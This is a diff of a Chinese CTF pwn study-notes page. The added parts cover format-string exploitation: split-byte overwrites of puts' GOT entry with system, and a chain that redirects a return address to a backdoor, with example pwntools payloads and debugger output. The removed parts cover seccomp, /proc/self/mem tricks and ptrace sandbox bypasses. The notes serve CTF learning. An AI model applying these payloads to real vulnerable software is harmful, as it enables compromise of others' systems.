-</span></span><span class="line"><span class="cl"> <span class="n">R13</span>  <span class="mh">0x4007a6</span> <span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">rbp</span>
-</span></span><span class="line"><span class="cl"> <span class="n">R14</span>  <span class="mh">0x0</span>
-</span></span><span class="line"><span class="cl"> <span class="n">R15</span>  <span class="mh">0x7ffff7ffd040</span> <span class="p">(</span><span class="n">_rtld_global</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0x7ffff7ffe2e0</span> <span class="err">◂—</span> <span class="mh">0x0</span>
-</span></span><span class="line"><span class="cl"> <span class="n">RBP</span>  <span class="mh">0x7fffffffde50</span> <span class="err">◂—</span> <span class="mh">0x1</span>
-</span></span><span class="line"><span class="cl"> <span class="n">RSP</span>  <span class="mh">0x7fffffffde10</span> <span class="err">◂—</span> <span class="mh">0x41fc1000</span>
-</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">RIP</span>  <span class="mh">0x40088b</span> <span class="p">(</span><span class="n">main</span><span class="o">+</span><span class="mi">229</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">call</span>   <span class="mh">0x400640</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>使用格式化字符串漏洞泄露栈地址，若main函数调用了foo函数，foo函数存在该漏洞，又需要泄露的目标栈地址在IDA中可见与ebp（此处的ebp为main函数的栈底）的距离，可劫持foo函数栈帧中的ebp（该ebp指向prev ebp即main函数的ebp）。</p>
 <p><img src="/img/pwn_note.zh-cn.assets/-172844664601225.assets"
 	
 	
@@ -4617,6 +5463,21 @@
 	
 	
 ></p>
+<p><strong>全局变量</strong></p>
+<p>当存在<strong>比较时</strong>可判断该变量是否为全局变量(<code>i</code>)，一般在bss段，若是则可以直接获取其地址进行格式化字符串覆盖绕过<strong>比较</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="p">.</span><span class="nl">bss</span><span class="p">:</span><span class="mo">00000000004040</span><span class="mi">8</span><span class="n">C</span> <span class="n">i</span>            <span class="n">dd</span> <span class="o">?</span>             <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="nl">main</span><span class="p">:</span><span class="n">loc_401404</span><span class="err">↑</span><span class="n">r</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>3字节拆分</strong></p>
+<ul>
+<li>可向栈上写入got表地址，目的：覆盖puts的got表为system</li>
+<li><strong>注： libc 中两个函数之间最多差 3 字节，若只修改⼀次，只能改 4 字节，此时打印出的字符数可能上亿次，使得内存爆了，所以改两次，第一次改1字节，第二次改2字节</strong></li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -4625,23 +5486,16 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>  <span class="c1">// 从标准输入读取最多0x100（256）字节的数据到v5中
-</span></span></span><span class="line"><span class="cl"><span class="c1">//等价于read(0, buf, 0x100uLL);
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">printf</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v5</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v5</span><span class="p">);</span>  <span class="c1">// 将v5的内容作为字符串格式打印到标准输出
-</span></span></span><span class="line"><span class="cl"><span class="c1">//等价于printf(buf)
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>全局变量</strong></p>
-<p>当存在<strong>比较时</strong>可判断该变量是否为全局变量(<code>i</code>)，一般在bss段，若是则可以直接获取其地址进行格式化字符串覆盖绕过<strong>比较</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="p">.</span><span class="nl">bss</span><span class="p">:</span><span class="mo">00000000004040</span><span class="mi">8</span><span class="n">C</span> <span class="n">i</span>               <span class="n">dd</span> <span class="o">?</span>                    <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="nl">main</span><span class="p">:</span><span class="n">loc_401404</span><span class="err">↑</span><span class="n">r</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="c1"># 栈上payload 偏移17, 18</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pad</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="si">}</span><span class="s1">c%17$hhn&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">pad</span> <span class="o">+=</span> <span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="p">((</span><span class="n">system</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">system</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="si">}</span><span class="s1">c%18$hn&#39;</span> <span class="c1"># %c为叠加, 减去前面累计的值</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>多次利用链</strong></p>
+<ul>
+<li>有多次利用机会，目标为覆盖返回地址为后门地址</li>
+</ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -4658,14 +5512,12 @@
 </span><span class="lnt">12
 </span><span class="lnt">13
 </span><span class="lnt">14
-</span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># 目标：覆盖返回地址为后门地址</span>
-</span></span><span class="line"><span class="cl"><span class="n">rbp</span>     <span class="mi">8</span>  <span class="mh">0x7fffffffdfe0</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">rbp</span>     <span class="mi">8</span>  <span class="mh">0x7fffffffdfe0</span>
 </span></span><span class="line"><span class="cl">		<span class="mi">9</span>  <span class="mh">0x7fffffffdfe8</span> <span class="err">—▸</span> <span class="mh">0x4012ba</span> <span class="p">(</span><span class="n">main</span><span class="o">+</span><span class="mi">28</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">mov</span>    <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span> <span class="c1"># 返回地址</span>
 </span></span><span class="line"><span class="cl">		   <span class="o">...</span>
-</span></span><span class="line"><span class="cl">        <span class="mi">15</span> <span class="mh">0x7fffffffe018</span> <span class="err">—▸</span> <span class="mh">0x7fffffffe118</span> <span class="err">—▸</span> <span class="mh">0x7fffffffe437</span> <span class="err">◂—</span> <span class="s1">&#39;/home/pwn&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">15</span> <span class="mh">0x7fffffffe018</span> <span class="err">—▸</span> <span class="mh">0x7fffffffe118</span> <span class="err">—▸</span> <span class="mh">0x7fffffffe437</span> <span class="err">◂—</span> <span class="s1">&#39;/home/pwn&#39;</span> <span class="c1"># 利用链</span>
 </span></span><span class="line"><span class="cl">           <span class="o">...</span>
 </span></span><span class="line"><span class="cl">        <span class="mi">47</span> <span class="mh">0x7fffffffe118</span> <span class="err">—▸</span> <span class="mh">0x7fffffffe437</span> <span class="err">◂—</span> <span class="s1">&#39;/home/pwn&#39;</span>
 </span></span><span class="line"><span class="cl">
@@ -4685,39 +5537,18 @@
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
-</span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%8$p&#39;</span> 									<span class="c1"># 泄露栈地址 stack = int(io.recv(12), 16) - 0x8, 此为返回地址9</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;%8$p&#39;</span> 	<span class="c1"># 泄露栈地址 stack = int(io.recv(12), 16) - 0x8, 此为返回地址9</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="n">stack</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="si">}</span><span class="s1">c%15$hn&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> 	<span class="c1"># 15-&gt;47-&gt;? 更改为 15-&gt;47-&gt;9</span>
 </span></span><span class="line"><span class="cl"><span class="n">payload3</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="n">backdoor</span> <span class="o">&amp;</span> <span class="mh">0xffff</span><span class="si">}</span><span class="s1">c%47$hn&#39;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> 	<span class="c1"># 47-&gt;9-&gt;(main+28) 更改为47-&gt;9-&gt;(backdoor)</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># f&#39;%{func &amp; 0xffff}c%number$hn&#39; # 将func地址作为数值(16位)作为%c写入到栈中第number个参数指向的地址中</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># f&#39;%{func &amp; 0xffff}c%number$hn&#39;将func地址作为数值(16位)由%c写入栈中第number个参数指向的地址中</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="沙箱sandbox">沙箱Sandbox</h2>
-<p>绕过：查看ret2syscall中orw绕过</p>
-<p>限制execve导致不能使用onegadget和system调用，一般两种方式开启沙箱</p>
+</div><p><strong>一次改同链2次</strong></p>
 <ul>
-<li>采用prctl函数调用</li>
-<li>使用seccomp库函数</li>
-</ul>
-<p><strong>seccomp</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">v</span> <span class="o">=</span> <span class="n">seccomp_init</span><span class="p">(</span><span class="mi">111LL</span><span class="p">);</span> <span class="c1">// 初始化，参数表示用于过滤的操作模式
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">seccomp_rule_add</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">59LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span> <span class="c1">// 禁用59系统调用号execve
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">seccomp_load</span><span class="p">(</span><span class="n">v</span><span class="p">);</span> <span class="c1">// 加载过滤器
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="proc泄露">/proc泄露</h3>
-<ul>
-<li>保护全开，提供<code>open</code>，<code>read</code>，<code>write</code>，<code>lseek</code>函数</li>
+<li>printf解析机制：其遇到第⼀个位置指定的格式化字符串%15$hn，就会把整个格式化字符串中所有位置指定字符⼀起解析</li>
+<li>格式化字符串改同一条链子两次不能用2次<code>%$</code>，需要第一次改用<code>%</code>，第二次用<code>%$</code></li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -4727,453 +5558,10 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="nl">open</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl"><span class="n">O_RDONLY</span>        <span class="mo">00000000</span>
-</span></span><span class="line"><span class="cl"><span class="n">O_WRONLY</span>        <span class="mo">00000001</span>
-</span></span><span class="line"><span class="cl"><span class="n">O_RDWR</span>          <span class="mo">00000002</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><ul>
-<li><strong>lseek</strong>函数：在文件中移动文件指针的位置</li>
-</ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">off_t</span> <span class="nf">lseek</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="n">off_t</span> <span class="n">offset</span><span class="p">,</span> <span class="kt">int</span> <span class="n">whence</span><span class="p">);</span><span class="c1">// 返回文件指针偏移值 或 -1
-</span></span></span><span class="line"><span class="cl"><span class="c1">// fd: 文件描述符   offset: 相对于whence的偏移量   
-</span></span></span><span class="line"><span class="cl"><span class="c1">// whence: 文件指针基准位置【SEEK_SET 0 开头, SEEK_CUR 1 当前, SEEK_END 2 结尾】
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>/proc 文件系统</strong></p>
-<ol>
-<li>Linux内核提供的一种<strong>伪</strong>文件系统，运行时可访问、设置内核内部数据结构，只存在内存中，不占外存空间</li>
-<li><code>/proc/self/maps</code>: 得到当前进程内存映射关系，等价于pwndbg中的<code>vmmap</code>，open只可读，<strong>可获取内存代码段基址</strong></li>
-</ol>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">vmmap</span>
-</span></span><span class="line"><span class="cl"><span class="nl">LEGEND</span><span class="p">:</span> <span class="n">STACK</span> <span class="o">|</span> <span class="n">HEAP</span> <span class="o">|</span> <span class="n">CODE</span> <span class="o">|</span> <span class="n">DATA</span> <span class="o">|</span> <span class="n">RWX</span> <span class="o">|</span> <span class="n">RODATA</span>
-</span></span><span class="line"><span class="cl">    <span class="mh">0x555555554000</span>     <span class="mh">0x555555555000</span> <span class="n">r</span><span class="o">--</span><span class="n">p</span>     <span class="mi">1000</span> <span class="mi">0</span>      <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">zhou</span><span class="o">/</span><span class="n">pwn</span>
-</span></span><span class="line"><span class="cl"><span class="c1">// 0x555555554000 即为文件基址
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><ol>
-<li><code>/proc/self/mem</code>: 进程内存内容，open可读可写，修改该文件等效于直接修改当前进程内存，<strong>结合maps及IDA确定偏移量以及lseek修改文件指针进行读取修改</strong></li>
-</ol>
-<p><img src="/img/pwn_note.zh-cn.assets/-172844670575243.assets"
-	
-	
-	
-	loading="lazy"
-	
-		alt="img"
-	
-	
-></p>
-<p><strong>绕过利用</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// open时文件包含flag将会报错
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span> <span class="n">strstr</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#34;flag&#34;</span><span class="p">)</span> <span class="p">){</span> <span class="c1">// filename中查找第一次出现&#34;flag&#34;的位置
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">// IDA
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">.</span><span class="nl">rodata</span><span class="p">:</span><span class="mo">000000000000216</span><span class="n">C</span> <span class="n">needle</span>          <span class="n">db</span> <span class="err">&#39;</span><span class="n">flag</span><span class="err">&#39;</span><span class="p">,</span><span class="mi">0</span>             <span class="p">;</span> <span class="n">DATA</span> <span class="nl">XREF</span><span class="p">:</span> <span class="n">Open</span><span class="o">+</span><span class="mi">4</span><span class="n">D</span><span class="err">↑</span><span class="n">o</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>通过maps泄露基址且加上IDA中偏移使用lseek和mem将&rsquo;flag&rsquo; write更改为别的字符串可绕过检查</p>
-<h3 id="ptrace进程">Ptrace进程</h3>
-<p><strong>__WAIT_STATUS</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// 定义了__WAIT_STATUS [union: 共用同一块内存,兼容系统]
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">typedef</span> <span class="k">union</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="c1">// 都用于表示进程状态
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">union</span> <span class="n">wait</span> <span class="o">*</span><span class="n">__uptr</span><span class="p">;</span> <span class="c1">// 早期系统 指向 union wait 类型的指针
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="o">*</span><span class="n">__iptr</span><span class="p">;</span>        <span class="c1">// 现代系统 指向        int 类型的指针
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="n">__WAIT_STATUS</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">__transparent_union__</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1">// IDA 
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">__WAIT_STATUS</span> <span class="n">stat_loc</span><span class="p">;</span> <span class="c1">// 存储进程状态的变量 用于判断进程是否在系统调用的标志
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">HIDWORD</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">.</span><span class="n">__iptr</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// iptr指针指向的地址(64位)的高32位置为0 对应源码 int in_syscall = 0
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">wait</span><span class="p">((</span><span class="n">__WAIT_STATUS</span><span class="p">)</span><span class="o">&amp;</span><span class="n">stat_loc</span><span class="p">);</span> <span class="c1">// 父进程等待子进程系统调用, 状态存储在stat_loc
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">stat_loc</span><span class="p">.</span><span class="n">__uptr</span> <span class="o">&amp;</span> <span class="mh">0xB00</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0xB00</span> <span class="p">)</span> <span class="c1">// __uptr 对应源码的 int status
-</span></span></span><span class="line"><span class="cl"><span class="c1">// Linux 进程状态码 以宏解读: -&gt; 判断是否遇到段错误
-</span></span></span><span class="line"><span class="cl"><span class="c1">// 0x100：子进程被跟踪 (ptraced)
-</span></span></span><span class="line"><span class="cl"><span class="c1">// 0x200：子进程遇到一个致命信号（如段错误）
-</span></span></span><span class="line"><span class="cl"><span class="c1">// 0x800：子进程在执行系统调用时发生错误
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl"><span class="n">LOBYTE</span><span class="p">(</span><span class="n">stat_loc</span><span class="p">.</span><span class="n">__uptr</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">127</span> <span class="c1">// LOBYTE获取低8位, 127为 wait(pid) pid标识的命令未知的退出状态值
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>fork</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="n">v</span> <span class="o">=</span> <span class="n">fork</span><span class="p">();</span> <span class="c1">// 子进程中返回0，父进程中返回子进程的PID
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">v</span> <span class="o">&amp;</span> <span class="mh">0x80000000</span> <span class="o">!=</span> <span class="mi">0</span> <span class="c1">// 判断 v 有符号数的最高位是否为1，为1则为负数，为0则为正数，判断v是否为负数
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">v</span><span class="p">)</span> <span class="p">{}</span>  <span class="c1">// 进入子进程
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>ptrace：断点调试和系统调用跟踪</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// 一个进程可观察和控制另一个进程的执行
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ptrace</span><span class="p">(</span><span class="k">enum</span> <span class="n">__ptrace_request</span> <span class="n">op</span><span class="p">,</span> <span class="n">pid_t</span> <span class="n">pid</span><span class="p">,</span><span class="kt">void</span> <span class="o">*</span><span class="n">addr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">v1</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_TRACEME</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span> <span class="c1">// 指示该进程由父进程跟踪, 后续参数忽略
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">v1</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_ATTACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span> <span class="c1">// 跟踪调试指定pid进程, 此时子进程等待, 父进程可使用ptrace调试
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SYSCALL</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span> <span class="c1">// 重新启动停止的子进程 or 挂起子进程，直到子进程发出系统调用，父进程拦截处理
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_KILL</span><span class="p">,</span> <span class="n">a1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span> <span class="c1">// 杀掉子进程
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
-</span></span><span class="line"><span class="cl"><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="n">vg</span><span class="p">);</span> <span class="c1">// 获取子进程寄存器状态, 内容存在vg中
-</span></span></span><span class="line"><span class="cl"><span class="c1">// 源码
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">rax</span> <span class="o">=</span> <span class="n">regs</span><span class="p">.</span><span class="n">orig_rax</span><span class="p">;</span>  <span class="c1">// IDA中源码将显示 v13 = v26等 需要判断
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">rdi</span><span class="o">=</span><span class="n">regs</span><span class="p">.</span><span class="n">rdi</span><span class="p">;</span> 
-</span></span><span class="line"><span class="cl"><span class="n">rsi</span><span class="o">=</span><span class="n">regs</span><span class="p">.</span><span class="n">rsi</span><span class="p">;</span> 
-</span></span><span class="line"><span class="cl"><span class="n">rdx</span><span class="o">=</span><span class="n">regs</span><span class="p">.</span><span class="n">rdx</span><span class="p">;</span> 
-</span></span><span class="line"><span class="cl"><span class="n">rcx</span><span class="o">=</span><span class="n">regs</span><span class="p">.</span><span class="n">rcx</span><span class="p">;</span> 
-</span></span><span class="line"><span class="cl"><span class="n">rip</span><span class="o">=</span><span class="n">regs</span><span class="p">.</span><span class="n">rip</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="n">vg</span><span class="p">);</span> <span class="c1">// 设置子进程pid的寄存器值为vg内容
-</span></span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>例子：NepCTF2024——NepBox</strong></p>
-<ul>
-<li><strong>子进程</strong>：前提mmap了一段地址0xDEAD000，这段空间不仅可以布置shellcode，还可以在更高的地方存放泄露的flag内容，可以向该地址写入shellcode，且会由子进程执行</li>
-<li><strong>父进程</strong>：会在子进程调用系统调用前拦截并对系统调用运用<strong>白名单</strong>处理，，采用open，read，write到stdout获取flag值</li>
-</ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">case</span> <span class="nl">__NR_openat</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl">    <span class="n">permission</span><span class="o">=</span><span class="n">rdx</span><span class="p">;</span> 
-</span></span><span class="line"><span class="cl">    <span class="k">goto</span> <span class="n">OpenFile</span><span class="p">;</span> 
-</span></span><span class="line"><span class="cl"><span class="k">case</span> <span class="nl">__NR_open</span><span class="p">:</span> 
-</span></span><span class="line"><span class="cl">    <span class="n">permission</span><span class="o">=</span><span class="n">rsi</span><span class="p">;</span> <span class="c1">// rsi != 1
